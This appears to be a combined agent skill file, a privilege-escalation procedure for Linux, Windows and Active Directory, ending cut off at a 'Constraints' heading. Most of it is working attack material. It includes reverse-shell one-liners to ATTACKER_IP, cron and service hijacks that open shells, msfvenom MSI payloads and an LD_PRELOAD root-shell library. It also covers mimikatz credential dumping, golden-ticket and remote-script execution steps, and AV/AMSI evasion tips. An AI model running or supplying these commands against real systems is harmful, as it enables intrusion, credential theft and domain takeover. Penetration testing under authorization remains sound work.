---
name: privilege-escalation
description: Comprehensive Power SOP for Privilege Escalation. Combined from multiple specialized skills.
---

# Privilege Escalation Master SOP



--- SECTION: LINUX-PRIVILEGE-ESCALATION ---


# Linux Privilege Escalation

## Purpose

Execute systematic privilege escalation assessments on Linux systems to identify and exploit misconfigurations, vulnerable services, and security weaknesses that allow elevation from low-privilege user access to root-level control. This skill enables comprehensive enumeration and exploitation of kernel vulnerabilities, sudo misconfigurations, SUID binaries, cron jobs, capabilities, PATH hijacking, and NFS weaknesses.

## Inputs / Prerequisites

### Required Access
- Low-privilege shell access to target Linux system
- Ability to execute commands (interactive or semi-interactive shell)
- Network access for reverse shell connections (if needed)
- Attacker machine for payload hosting and receiving shells

### Technical Requirements
- Understanding of Linux filesystem permissions and ownership
- Familiarity with common Linux utilities and scripting
- Knowledge of kernel versions and associated vulnerabilities
- Basic understanding of compilation (gcc) for custom exploits

### Recommended Tools
- LinPEAS, LinEnum, or Linux Smart Enumeration scripts
- Linux Exploit Suggester (LES)
- GTFOBins reference for binary exploitation
- John the Ripper or Hashcat for password cracking
- Netcat or similar for reverse shells

## Outputs / Deliverables

### Primary Outputs
- Root shell access on target system
- Privilege escalation path documentation
- System enumeration findings report
- Recommendations for remediation

### Evidence Artifacts
- Screenshots of successful privilege escalation
- Command output logs demonstrating root access
- Identified vulnerability details
- Exploited configuration files

## Core Workflow

### Phase 1: System Enumeration

#### Basic System Information
Gather fundamental system details for vulnerability research:

```bash
# Hostname and system role
hostname

# Kernel version and architecture
uname -a

# Detailed kernel information
cat /proc/version

# Operating system details
cat /etc/issue
cat /etc/*-release

# Architecture
arch
```

#### User and Permission Enumeration

```bash
# Current user context
whoami
id

# Users with login shells
cat /etc/passwd | grep -v nologin | grep -v false

# Users with home directories
cat /etc/passwd | grep home

# Group memberships
groups

# Other logged-in users
w
who
```

#### Network Information

```bash
# Network interfaces
ifconfig
ip addr

# Routing table
ip route

# Active connections
netstat -antup
ss -tulpn

# Listening services
netstat -l
```

#### Process and Service Enumeration

```bash
# All running processes
ps aux
ps -ef

# Process tree view
ps axjf

# Services running as root
ps aux | grep root
```

#### Environment Variables

```bash
# Full environment
env

# PATH variable (for hijacking)
echo $PATH
```

### Phase 2: Automated Enumeration

Deploy automated scripts for comprehensive enumeration:

```bash
# LinPEAS
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh

# LinEnum
./LinEnum.sh -t

# Linux Smart Enumeration
./lse.sh -l 1

# Linux Exploit Suggester
./les.sh
```

Transfer scripts to target system:

```bash
# On attacker machine
python3 -m http.server 8000

# On target machine
wget http://ATTACKER_IP:8000/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh
```

### Phase 3: Kernel Exploits

#### Identify Kernel Version

```bash
uname -r
cat /proc/version
```

#### Search for Exploits

```bash
# Use Linux Exploit Suggester
./linux-exploit-suggester.sh

# Manual search on exploit-db
searchsploit linux kernel [version]
```

#### Common Kernel Exploits

| Kernel Version | Exploit | CVE |
|---------------|---------|-----|
| 2.6.x - 3.x | Dirty COW | CVE-2016-5195 |
| 4.4.x - 4.13.x | Double Fetch | CVE-2017-16995 |
| 5.8+ | Dirty Pipe | CVE-2022-0847 |

#### Compile and Execute

```bash
# Transfer exploit source
wget http://ATTACKER_IP/exploit.c

# Compile on target
gcc exploit.c -o exploit

# Execute
./exploit
```

### Phase 4: Sudo Exploitation

#### Enumerate Sudo Privileges

```bash
sudo -l
```

#### GTFOBins Sudo Exploitation
Reference https://gtfobins.github.io for exploitation commands:

```bash
# Example: vim with sudo
sudo vim -c ':!/bin/bash'

# Example: find with sudo
sudo find . -exec /bin/sh \; -quit

# Example: awk with sudo
sudo awk 'BEGIN {system("/bin/bash")}'

# Example: python with sudo
sudo python -c 'import os; os.system("/bin/bash")'

# Example: less with sudo
sudo less /etc/passwd
!/bin/bash
```

#### LD_PRELOAD Exploitation
When env_keep includes LD_PRELOAD:

```c
// shell.c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}
```

```bash
# Compile shared library
gcc -fPIC -shared -o shell.so shell.c -nostartfiles

# Execute with sudo
sudo LD_PRELOAD=/tmp/shell.so find
```

### Phase 5: SUID Binary Exploitation

#### Find SUID Binaries

```bash
find / -type f -perm -04000 -ls 2>/dev/null
find / -perm -u=s -type f 2>/dev/null
```

#### Exploit SUID Binaries
Reference GTFOBins for SUID exploitation:

```bash
# Example: base64 for file reading
LFILE=/etc/shadow
base64 "$LFILE" | base64 -d

# Example: cp for file writing
cp /bin/bash /tmp/bash
chmod +s /tmp/bash
/tmp/bash -p

# Example: find with SUID
find . -exec /bin/sh -p \; -quit
```

#### Password Cracking via SUID

```bash
# Read shadow file (if base64 has SUID)
base64 /etc/shadow | base64 -d > shadow.txt
base64 /etc/passwd | base64 -d > passwd.txt

# On attacker machine
unshadow passwd.txt shadow.txt > hashes.txt
john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
```

#### Add User to passwd (if nano/vim has SUID)

```bash
# Generate password hash
openssl passwd -1 -salt new newpassword

# Add to /etc/passwd (using SUID editor)
newuser:$1$new$p7ptkEKU1HnaHpRtzNizS1:0:0:root:/root:/bin/bash
```

### Phase 6: Capabilities Exploitation

#### Enumerate Capabilities

```bash
getcap -r / 2>/dev/null
```

#### Exploit Capabilities

```bash
# Example: python with cap_setuid
/usr/bin/python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'

# Example: vim with cap_setuid
./vim -c ':py3 import os; os.setuid(0); os.execl("/bin/bash", "bash", "-c", "reset; exec bash")'

# Example: perl with cap_setuid
perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/bash";'
```

### Phase 7: Cron Job Exploitation

#### Enumerate Cron Jobs

```bash
# System crontab
cat /etc/crontab

# User crontabs
ls -la /var/spool/cron/crontabs/

# Cron directories
ls -la /etc/cron.*

# Systemd timers
systemctl list-timers
```

#### Exploit Writable Cron Scripts

```bash
# Identify writable cron script from /etc/crontab
ls -la /opt/backup.sh        # Check permissions
echo 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1' >> /opt/backup.sh

# If cron references non-existent script in writable PATH
echo -e '#!/bin/bash\nbash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1' > /home/user/antivirus.sh
chmod +x /home/user/antivirus.sh
```

### Phase 8: PATH Hijacking

```bash
# Find SUID binary calling external command
strings /usr/local/bin/suid-binary
# Shows: system("service apache2 start")

# Hijack by creating malicious binary in writable PATH
export PATH=/tmp:$PATH
echo -e '#!/bin/bash\n/bin/bash -p' > /tmp/service
chmod +x /tmp/service
/usr/local/bin/suid-binary      # Execute SUID binary
```

### Phase 9: NFS Exploitation

```bash
# On target - look for no_root_squash option
cat /etc/exports

# On attacker - mount share and create SUID binary
showmount -e TARGET_IP
mount -o rw TARGET_IP:/share /tmp/nfs

# Create and compile SUID shell
echo 'int main(){setuid(0);setgid(0);system("/bin/bash");return 0;}' > /tmp/nfs/shell.c
gcc /tmp/nfs/shell.c -o /tmp/nfs/shell && chmod +s /tmp/nfs/shell

# On target - execute
/share/shell
```

## Quick Reference

### Enumeration Commands Summary
| Purpose | Command |
|---------|---------|
| Kernel version | `uname -a` |
| Current user | `id` |
| Sudo rights | `sudo -l` |
| SUID files | `find / -perm -u=s -type f 2>/dev/null` |
| Capabilities | `getcap -r / 2>/dev/null` |
| Cron jobs | `cat /etc/crontab` |
| Writable dirs | `find / -writable -type d 2>/dev/null` |
| NFS exports | `cat /etc/exports` |

### Reverse Shell One-Liners
```bash
# Bash
bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1

# Python
python -c 'import socket,subprocess,os;s=socket.socket();s.connect(("ATTACKER_IP",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])'

# Netcat
nc -e /bin/bash ATTACKER_IP 4444

# Perl
perl -e 'use Socket;$i="ATTACKER_IP";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/bash -i");'
```

### Key Resources
- GTFOBins: https://gtfobins.github.io
- LinPEAS: https://github.com/carlospolop/PEASS-ng
- Linux Exploit Suggester: https://github.com/mzet-/linux-exploit-suggester

## Constraints and Guardrails

### Operational Boundaries
- Verify kernel exploits in test environment before production use
- Failed kernel exploits may crash the system
- Document all changes made during privilege escalation
- Maintain access persistence only as authorized

### Technical Limitations
- Modern kernels may have exploit mitigations (ASLR, SMEP, SMAP)
- AppArmor/SELinux may restrict exploitation techniques
- Container environments limit kernel-level exploits
- Hardened systems may have restricted sudo configurations

### Legal and Ethical Requirements
- Written authorization required before testing
- Stay within defined scope boundaries
- Report critical findings immediately
- Do not access data beyond scope requirements

## Examples

### Example 1: Sudo to Root via find

**Scenario**: User has sudo rights for find command

```bash
$ sudo -l
User user may run the following commands:
    (root) NOPASSWD: /usr/bin/find

$ sudo find . -exec /bin/bash \; -quit
# id
uid=0(root) gid=0(root) groups=0(root)
```

### Example 2: SUID base64 for Shadow Access

**Scenario**: base64 binary has SUID bit set

```bash
$ find / -perm -u=s -type f 2>/dev/null | grep base64
/usr/bin/base64

$ base64 /etc/shadow | base64 -d
root:$6$xyz...:18000:0:99999:7:::

# Crack offline with john
$ john --wordlist=rockyou.txt shadow.txt
```

### Example 3: Cron Job Script Hijacking

**Scenario**: Root cron job executes writable script

```bash
$ cat /etc/crontab
* * * * * root /opt/scripts/backup.sh

$ ls -la /opt/scripts/backup.sh
-rwxrwxrwx 1 root root 50 /opt/scripts/backup.sh

$ echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' >> /opt/scripts/backup.sh

# Wait 1 minute
$ /tmp/bash -p
# id
uid=1000(user) gid=1000(user) euid=0(root)
```

## Troubleshooting

| Issue | Solutions |
|-------|-----------|
| Exploit compilation fails | Check for gcc: `which gcc`; compile on attacker for same arch; use `gcc -static` |
| Reverse shell not connecting | Check firewall; try ports 443/80; use staged payloads; check egress filtering |
| SUID binary not exploitable | Verify version matches GTFOBins; check AppArmor/SELinux; some binaries drop privileges |
| Cron job not executing | Verify cron running: `service cron status`; check +x permissions; verify PATH in crontab |


--- SECTION: WINDOWS-PRIVILEGE-ESCALATION ---


# Windows Privilege Escalation

## Purpose

Provide systematic methodologies for discovering and exploiting privilege escalation vulnerabilities on Windows systems during penetration testing engagements. This skill covers system enumeration, credential harvesting, service exploitation, token impersonation, kernel exploits, and various misconfigurations that enable escalation from standard user to Administrator or SYSTEM privileges.

## Inputs / Prerequisites

- **Initial Access**: Shell or RDP access as standard user on Windows system
- **Enumeration Tools**: WinPEAS, PowerUp, Seatbelt, or manual commands
- **Exploit Binaries**: Pre-compiled exploits or ability to transfer tools
- **Knowledge**: Understanding of Windows security model and privileges
- **Authorization**: Written permission for penetration testing activities

## Outputs / Deliverables

- **Privilege Escalation Path**: Identified vector to higher privileges
- **Credential Dump**: Harvested passwords, hashes, or tokens
- **Elevated Shell**: Command execution as Administrator or SYSTEM
- **Vulnerability Report**: Documentation of misconfigurations and exploits
- **Remediation Recommendations**: Fixes for identified weaknesses

## Core Workflow

### 1. System Enumeration

#### Basic System Information
```powershell
# OS version and patches
systeminfo | findstr /B /C:"OS Name" /C:"OS Version"
wmic qfe

# Architecture
wmic os get osarchitecture
echo %PROCESSOR_ARCHITECTURE%

# Environment variables
set
Get-ChildItem Env: | ft Key,Value

# List drives
wmic logicaldisk get caption,description,providername
```

#### User Enumeration
```powershell
# Current user
whoami
echo %USERNAME%

# User privileges
whoami /priv
whoami /groups
whoami /all

# All users
net user
Get-LocalUser | ft Name,Enabled,LastLogon

# User details
net user administrator
net user %USERNAME%

# Local groups
net localgroup
net localgroup administrators
Get-LocalGroupMember Administrators | ft Name,PrincipalSource
```

#### Network Enumeration
```powershell
# Network interfaces
ipconfig /all
Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address

# Routing table
route print
Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric

# ARP table
arp -A

# Active connections
netstat -ano

# Network shares
net share

# Domain Controllers
nltest /DCLIST:DomainName
```

#### Antivirus Enumeration
```powershell
# Check AV products
WMIC /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntivirusProduct Get displayName
```

### 2. Credential Harvesting

#### SAM and SYSTEM Files
```powershell
# SAM file locations
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM

# SYSTEM file locations
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\SYSTEM
%SYSTEMROOT%\System32\config\RegBack\system

# Extract hashes (from Linux after obtaining files)
pwdump SYSTEM SAM > sam.txt
samdump2 SYSTEM SAM -o sam.txt

# Crack with John
john --format=NT sam.txt
```

#### HiveNightmare (CVE-2021-36934)
```powershell
# Check vulnerability
icacls C:\Windows\System32\config\SAM
# Vulnerable if: BUILTIN\Users:(I)(RX)

# Exploit with mimikatz
mimikatz> token::whoami /full
mimikatz> misc::shadowcopies
mimikatz> lsadump::sam /system:\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM /sam:\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SAM
```

#### Search for Passwords
```powershell
# Search file contents
findstr /SI /M "password" *.xml *.ini *.txt
findstr /si password *.xml *.ini *.txt *.config

# Search registry
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s

# Windows Autologin credentials
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr "DefaultUserName DefaultDomainName DefaultPassword"

# PuTTY sessions
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions"

# VNC passwords
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query HKEY_LOCAL_MACHINE\SOFTWARE\RealVNC\WinVNC4 /v password

# Search for specific files
dir /S /B *pass*.txt == *pass*.xml == *cred* == *vnc* == *.config*
where /R C:\ *.ini
```

#### Unattend.xml Credentials
```powershell
# Common locations
C:\unattend.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\system32\sysprep.inf
C:\Windows\system32\sysprep\sysprep.xml

# Search for files
dir /s *sysprep.inf *sysprep.xml *unattend.xml 2>nul

# Decode base64 password (Linux)
echo "U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo=" | base64 -d
```

#### WiFi Passwords
```powershell
# List profiles
netsh wlan show profile

# Get cleartext password
netsh wlan show profile <SSID> key=clear

# Extract all WiFi passwords
for /f "tokens=4 delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off > nul & (netsh wlan show profiles name=%a key=clear | findstr "SSID Cipher Key" | find /v "Number" & echo.) & @echo on
```

#### PowerShell History
```powershell
# View PowerShell history
type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
cat (Get-PSReadlineOption).HistorySavePath
cat (Get-PSReadlineOption).HistorySavePath | sls passw
```

### 3. Service Exploitation

#### Incorrect Service Permissions
```powershell
# Find misconfigured services
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv "Everyone" * /accepteula
accesschk.exe -ucqv <service_name>

# Look for: SERVICE_ALL_ACCESS, SERVICE_CHANGE_CONFIG

# Exploit vulnerable service
sc config <service> binpath= "C:\nc.exe -e cmd.exe 10.10.10.10 4444"
sc stop <service>
sc start <service>
```

#### Unquoted Service Paths
```powershell
# Find unquoted paths
wmic service get name,displayname,pathname,startmode | findstr /i "Auto" | findstr /i /v "C:\Windows\\"
wmic service get name,displayname,startmode,pathname | findstr /i /v "C:\Windows\\" | findstr /i /v """

# Exploit: Place malicious exe in path
# For path: C:\Program Files\Some App\service.exe
# Try: C:\Program.exe or C:\Program Files\Some.exe
```

#### AlwaysInstallElevated
```powershell
# Check if enabled
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

# Both must return 0x1 for vulnerability

# Create malicious MSI
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f msi -o evil.msi

# Install (runs as SYSTEM)
msiexec /quiet /qn /i C:\evil.msi
```

### 4. Token Impersonation

#### Check Impersonation Privileges
```powershell
# Look for these privileges
whoami /priv

# Exploitable privileges:
# SeImpersonatePrivilege
# SeAssignPrimaryTokenPrivilege
# SeTcbPrivilege
# SeBackupPrivilege
# SeRestorePrivilege
# SeCreateTokenPrivilege
# SeLoadDriverPrivilege
# SeTakeOwnershipPrivilege
# SeDebugPrivilege
```

#### Potato Attacks
```powershell
# JuicyPotato (Windows Server 2019 and below)
JuicyPotato.exe -l 1337 -p c:\windows\system32\cmd.exe -a "/c c:\tools\nc.exe 10.10.10.10 4444 -e cmd.exe" -t *

# PrintSpoofer (Windows 10 and Server 2019)
PrintSpoofer.exe -i -c cmd

# RoguePotato
RoguePotato.exe -r 10.10.10.10 -e "C:\nc.exe 10.10.10.10 4444 -e cmd.exe" -l 9999

# GodPotato
GodPotato.exe -cmd "cmd /c whoami"
```

### 5. Kernel Exploitation

#### Find Kernel Vulnerabilities
```powershell
# Use Windows Exploit Suggester
systeminfo > systeminfo.txt
python wes.py systeminfo.txt

# Or use Watson (on target)
Watson.exe

# Or use Sherlock PowerShell script
powershell.exe -ExecutionPolicy Bypass -File Sherlock.ps1
```

#### Common Kernel Exploits
```
MS17-010 (EternalBlue) - Windows 7/2008/2003/XP
MS16-032 - Secondary Logon Handle - 2008/7/8/10/2012
MS15-051 - Client Copy Image - 2003/2008/7
MS14-058 - TrackPopupMenu - 2003/2008/7/8.1
MS11-080 - afd.sys - XP/2003
MS10-015 - KiTrap0D - 2003/XP/2000
MS08-067 - NetAPI - 2000/XP/2003
CVE-2021-1732 - Win32k - Windows 10/Server 2019
CVE-2020-0796 - SMBGhost - Windows 10
CVE-2019-1388 - UAC Bypass - Windows 7/8/10/2008/2012/2016/2019
```

### 6. Additional Techniques

#### DLL Hijacking
```powershell
# Find missing DLLs with Process Monitor
# Filter: Result = NAME NOT FOUND, Path ends with .dll

# Compile malicious DLL
# For x64: x86_64-w64-mingw32-gcc windows_dll.c -shared -o evil.dll
# For x86: i686-w64-mingw32-gcc windows_dll.c -shared -o evil.dll
```

#### Runas with Saved Credentials
```powershell
# List saved credentials
cmdkey /list

# Use saved credentials
runas /savecred /user:Administrator "cmd.exe /k whoami"
runas /savecred /user:WORKGROUP\Administrator "\\10.10.10.10\share\evil.exe"
```

#### WSL Exploitation
```powershell
# Check for WSL
wsl whoami

# Set root as default user
wsl --default-user root
# Or: ubuntu.exe config --default-user root

# Spawn shell as root
wsl whoami
wsl python -c 'import os; os.system("/bin/bash")'
```

## Quick Reference

### Enumeration Tools

| Tool | Command | Purpose |
|------|---------|---------|
| WinPEAS | `winPEAS.exe` | Comprehensive enumeration |
| PowerUp | `Invoke-AllChecks` | Service/path vulnerabilities |
| Seatbelt | `Seatbelt.exe -group=all` | Security audit checks |
| Watson | `Watson.exe` | Missing patches |
| JAWS | `.\jaws-enum.ps1` | Legacy Windows enum |
| PrivescCheck | `Invoke-PrivescCheck` | Privilege escalation checks |

### Default Writable Folders

```
C:\Windows\Temp
C:\Windows\Tasks
C:\Users\Public
C:\Windows\tracing
C:\Windows\System32\spool\drivers\color
C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys
```

### Common Privilege Escalation Vectors

| Vector | Check Command |
|--------|---------------|
| Unquoted paths | `wmic service get pathname \| findstr /i /v """` |
| Weak service perms | `accesschk.exe -uwcqv "Everyone" *` |
| AlwaysInstallElevated | `reg query HKCU\...\Installer /v AlwaysInstallElevated` |
| Stored credentials | `cmdkey /list` |
| Token privileges | `whoami /priv` |
| Scheduled tasks | `schtasks /query /fo LIST /v` |

### Impersonation Privilege Exploits

| Privilege | Tool | Usage |
|-----------|------|-------|
| SeImpersonatePrivilege | JuicyPotato | CLSID abuse |
| SeImpersonatePrivilege | PrintSpoofer | Spooler service |
| SeImpersonatePrivilege | RoguePotato | OXID resolver |
| SeBackupPrivilege | robocopy /b | Read protected files |
| SeRestorePrivilege | Enable-SeRestorePrivilege | Write protected files |
| SeTakeOwnershipPrivilege | takeown.exe | Take file ownership |

## Constraints and Limitations

### Operational Boundaries
- Kernel exploits may cause system instability
- Some exploits require specific Windows versions
- AV/EDR may detect and block common tools
- Token impersonation requires service account context
- Some techniques require GUI access

### Detection Considerations
- Credential dumping triggers security alerts
- Service modification logged in Event Logs
- PowerShell execution may be monitored
- Known exploit signatures detected by AV

### Legal Requirements
- Only test systems with written authorization
- Document all escalation attempts
- Avoid disrupting production systems
- Report all findings through proper channels

## Examples

### Example 1: Service Binary Path Exploitation
```powershell
# Find vulnerable service
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
# Result: RW MyService SERVICE_ALL_ACCESS

# Check current config
sc qc MyService

# Stop service and change binary path
sc stop MyService
sc config MyService binpath= "C:\Users\Public\nc.exe 10.10.10.10 4444 -e cmd.exe"
sc start MyService

# Catch shell as SYSTEM
```

### Example 2: AlwaysInstallElevated Exploitation
```powershell
# Verify vulnerability
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
# Both return: 0x1

# Generate payload (attacker machine)
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f msi -o shell.msi

# Transfer and execute
msiexec /quiet /qn /i C:\Users\Public\shell.msi

# Catch SYSTEM shell
```

### Example 3: JuicyPotato Token Impersonation
```powershell
# Verify SeImpersonatePrivilege
whoami /priv
# SeImpersonatePrivilege Enabled

# Run JuicyPotato
JuicyPotato.exe -l 1337 -p c:\windows\system32\cmd.exe -a "/c c:\users\public\nc.exe 10.10.10.10 4444 -e cmd.exe" -t * -c {F87B28F1-DA9A-4F35-8EC0-800EFCF26B83}

# Catch SYSTEM shell
```

### Example 4: Unquoted Service Path
```powershell
# Find unquoted path
wmic service get name,pathname | findstr /i /v """
# Result: C:\Program Files\Vuln App\service.exe

# Check write permissions
icacls "C:\Program Files\Vuln App"
# Result: Users:(W)

# Place malicious binary
copy C:\Users\Public\shell.exe "C:\Program Files\Vuln.exe"

# Restart service
sc stop "Vuln App"
sc start "Vuln App"
```

### Example 5: Credential Harvesting from Registry
```powershell
# Check for auto-logon credentials
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"
# DefaultUserName: Administrator
# DefaultPassword: P@ssw0rd123

# Use credentials
runas /user:Administrator cmd.exe
# Or for remote: psexec \\target -u Administrator -p P@ssw0rd123 cmd
```

## Troubleshooting

| Issue | Cause | Solution |
|-------|-------|----------|
| Exploit fails (AV detected) | AV blocking known exploits | Use obfuscated exploits; living-off-the-land (mshta, certutil); custom compiled binaries |
| Service won't start | Binary path syntax | Ensure space after `=` in binpath: `binpath= "C:\path\binary.exe"` |
| Token impersonation fails | Wrong privilege/version | Check `whoami /priv`; verify Windows version compatibility |
| Can't find kernel exploit | System patched | Run Windows Exploit Suggester: `python wes.py systeminfo.txt` |
| PowerShell blocked | Execution policy/AMSI | Use `powershell -ep bypass -c "cmd"` or `-enc <base64>` |


--- SECTION: PRIVILEGE-ESCALATION-METHODS ---


# Privilege Escalation Methods

## Purpose

Provide comprehensive techniques for escalating privileges from a low-privileged user to root/administrator access on compromised Linux and Windows systems. Essential for penetration testing post-exploitation phase and red team operations.

## Inputs/Prerequisites

- Initial low-privilege shell access on target system
- Kali Linux or penetration testing distribution
- Tools: Mimikatz, PowerView, PowerUpSQL, Responder, Impacket, Rubeus
- Understanding of Windows/Linux privilege models
- For AD attacks: Domain user credentials and network access to DC

## Outputs/Deliverables

- Root or Administrator shell access
- Extracted credentials and hashes
- Persistent access mechanisms
- Domain compromise (for AD environments)

---

## Core Techniques

### Linux Privilege Escalation

#### 1. Abusing Sudo Binaries

Exploit misconfigured sudo permissions using GTFOBins techniques:

```bash
# Check sudo permissions
sudo -l

# Exploit common binaries
sudo vim -c ':!/bin/bash'
sudo find /etc/passwd -exec /bin/bash \;
sudo awk 'BEGIN {system("/bin/bash")}'
sudo python -c 'import pty;pty.spawn("/bin/bash")'
sudo perl -e 'exec "/bin/bash";'
sudo less /etc/hosts    # then type: !bash
sudo man man            # then type: !bash
sudo env /bin/bash
```

#### 2. Abusing Scheduled Tasks (Cron)

```bash
# Find writable cron scripts
ls -la /etc/cron*
cat /etc/crontab

# Inject payload into writable script
echo 'chmod +s /bin/bash' > /home/user/systemupdate.sh
chmod +x /home/user/systemupdate.sh

# Wait for execution, then:
/bin/bash -p
```

#### 3. Abusing Capabilities

```bash
# Find binaries with capabilities
getcap -r / 2>/dev/null

# Python with cap_setuid
/usr/bin/python2.6 -c 'import os; os.setuid(0); os.system("/bin/bash")'

# Perl with cap_setuid
/usr/bin/perl -e 'use POSIX (setuid); POSIX::setuid(0); exec "/bin/bash";'

# Tar with cap_dac_read_search (read any file)
/usr/bin/tar -cvf key.tar /root/.ssh/id_rsa
/usr/bin/tar -xvf key.tar
```

#### 4. NFS Root Squashing

```bash
# Check for NFS shares
showmount -e <victim_ip>

# Mount and exploit no_root_squash
mkdir /tmp/mount
mount -o rw,vers=2 <victim_ip>:/tmp /tmp/mount
cd /tmp/mount
cp /bin/bash .
chmod +s bash
```

#### 5. MySQL Running as Root

```bash
# If MySQL runs as root
mysql -u root -p
\! chmod +s /bin/bash
exit
/bin/bash -p
```

---

### Windows Privilege Escalation

#### 1. Token Impersonation

```powershell
# Using SweetPotato (SeImpersonatePrivilege)
execute-assembly sweetpotato.exe -p beacon.exe

# Using SharpImpersonation
SharpImpersonation.exe user:<user> technique:ImpersonateLoggedOnuser
```

#### 2. Service Abuse

```powershell
# Using PowerUp
. .\PowerUp.ps1
Invoke-ServiceAbuse -Name 'vds' -UserName 'domain\user1'
Invoke-ServiceAbuse -Name 'browser' -UserName 'domain\user1'
```

#### 3. Abusing SeBackupPrivilege

```powershell
import-module .\SeBackupPrivilegeUtils.dll
import-module .\SeBackupPrivilegeCmdLets.dll
Copy-FileSebackupPrivilege z:\Windows\NTDS\ntds.dit C:\temp\ntds.dit
```

#### 4. Abusing SeLoadDriverPrivilege

```powershell
# Load vulnerable Capcom driver
.\eoploaddriver.exe System\CurrentControlSet\MyService C:\test\capcom.sys
.\ExploitCapcom.exe
```

#### 5. Abusing GPO

```powershell
.\SharpGPOAbuse.exe --AddComputerTask --Taskname "Update" `
  --Author DOMAIN\<USER> --Command "cmd.exe" `
  --Arguments "/c net user Administrator Password!@# /domain" `
  --GPOName "ADDITIONAL DC CONFIGURATION"
```

---

### Active Directory Attacks

#### 1. Kerberoasting

```bash
# Using Impacket
GetUserSPNs.py domain.local/user:password -dc-ip 10.10.10.100 -request

# Using CrackMapExec
crackmapexec ldap 10.0.2.11 -u 'user' -p 'pass' --kdcHost 10.0.2.11 --kerberoast output.txt
```

#### 2. AS-REP Roasting

```powershell
.\Rubeus.exe asreproast
```

#### 3. Golden Ticket

```powershell
# DCSync to get krbtgt hash
mimikatz# lsadump::dcsync /user:krbtgt

# Create golden ticket
mimikatz# kerberos::golden /user:Administrator /domain:domain.local `
  /sid:S-1-5-21-... /rc4:<NTLM_HASH> /id:500
```

#### 4. Pass-the-Ticket

```powershell
.\Rubeus.exe asktgt /user:USER$ /rc4:<NTLM_HASH> /ptt
klist  # Verify ticket
```

#### 5. Golden Ticket with Scheduled Tasks

```powershell
# 1. Elevate and dump credentials
mimikatz# token::elevate
mimikatz# vault::cred /patch
mimikatz# lsadump::lsa /patch

# 2. Create golden ticket
mimikatz# kerberos::golden /user:Administrator /rc4:<HASH> `
  /domain:DOMAIN /sid:<SID> /ticket:ticket.kirbi

# 3. Create scheduled task
schtasks /create /S DOMAIN /SC Weekly /RU "NT Authority\SYSTEM" `
  /TN "enterprise" /TR "powershell.exe -c 'iex (iwr http://attacker/shell.ps1)'"
schtasks /run /s DOMAIN /TN "enterprise"
```

---

### Credential Harvesting

#### LLMNR Poisoning

```bash
# Start Responder
responder -I eth1 -v

# Create malicious shortcut (Book.url)
[InternetShortcut]
URL=https://facebook.com
IconIndex=0
IconFile=\\attacker_ip\not_found.ico
```

#### NTLM Relay

```bash
responder -I eth1 -v
ntlmrelayx.py -tf targets.txt -smb2support
```

#### Dumping with VSS

```powershell
vssadmin create shadow /for=C:
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\NTDS.dit C:\temp\
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\temp\
```

---

## Quick Reference

| Technique | OS | Domain Required | Tool |
|-----------|-----|-----------------|------|
| Sudo Binary Abuse | Linux | No | GTFOBins |
| Cron Job Exploit | Linux | No | Manual |
| Capability Abuse | Linux | No | getcap |
| NFS no_root_squash | Linux | No | mount |
| Token Impersonation | Windows | No | SweetPotato |
| Service Abuse | Windows | No | PowerUp |
| Kerberoasting | Windows | Yes | Rubeus/Impacket |
| AS-REP Roasting | Windows | Yes | Rubeus |
| Golden Ticket | Windows | Yes | Mimikatz |
| Pass-the-Ticket | Windows | Yes | Rubeus |
| DCSync | Windows | Yes | Mimikatz |
| LLMNR Poisoning | Windows | Yes | Responder |

---

## Constraints

**Must:**
